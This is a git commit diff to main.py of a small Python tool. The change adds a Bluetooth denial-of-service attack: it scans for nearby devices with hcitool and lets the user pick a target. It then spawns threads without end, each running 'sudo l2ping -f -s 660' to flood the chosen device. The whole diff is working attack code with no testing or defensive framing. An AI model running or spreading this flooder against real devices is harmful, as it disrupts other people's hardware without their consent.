e2cb50a782c86fe38833966d79589ce2cbcaac7f
ceigh <hilth@protonmail.com>
2018-06-27 02:25:50 +0500

    Stable (?)

--- main.py
+++ main.py
@@ -15,14 +15,32 @@ def bye():
     print("\nBye!")
     from time import sleep
     sleep(1)
-    print("\033c")
+    # print("\033c")
 
 
 def get_devices():
     print("Scanning...\n")
-    hcitool_out = subprocess.check_output(['hcitool', 'scan']).decode()[13:-1]
-    devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
-    return devices
+    if len(subprocess.check_output(['hcitool', 'dev']).decode()[9:]) > 0:
+        hcitool_out = subprocess.check_output(['hcitool', 'scan']).decode()[13:-1]
+        devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
+        return devices
+    else:
+        exit("Enable BT first")
+
+
+def attack(target):
+    from threading import Thread
+
+    def sp():
+        while 1:
+            subprocess.Popen(['sudo', 'l2ping', '-f', '-s', '660', target[0]], stderr=subprocess.STDOUT)
+
+    print("Attacking '%s'...\nTo stop type Ctrl+C" % target[1])
+    try:
+        while 1:
+            Thread(target=sp).start()
+    except KeyboardInterrupt:
+        bye()
 
 
 def main():
@@ -36,19 +54,19 @@ def main():
         else:
             bye()
     elif dev_number == 1:
-        print("Attacking '%s'..." % devices[0][1])
+        attack(devices[0])
     else:
         print("Several devices found:")
         for dev in range(dev_number):
             print("%d) '%s' <%s>" % (dev, devices[dev][1], devices[dev][0]))
         while 1:
             try:
-                target = int(input("Select a device (0-%d): " % (dev_number - 1)))
+                target_i = int(input("Select a device (0-%d): " % (dev_number - 1)))
             except ValueError:
                 continue
-            if target in range(dev_number):
+            if target_i in range(dev_number):
                 break
-        print("Attacking '%s'..." % devices[target][1])
+        attack(devices[target_i])
 
 
 main()
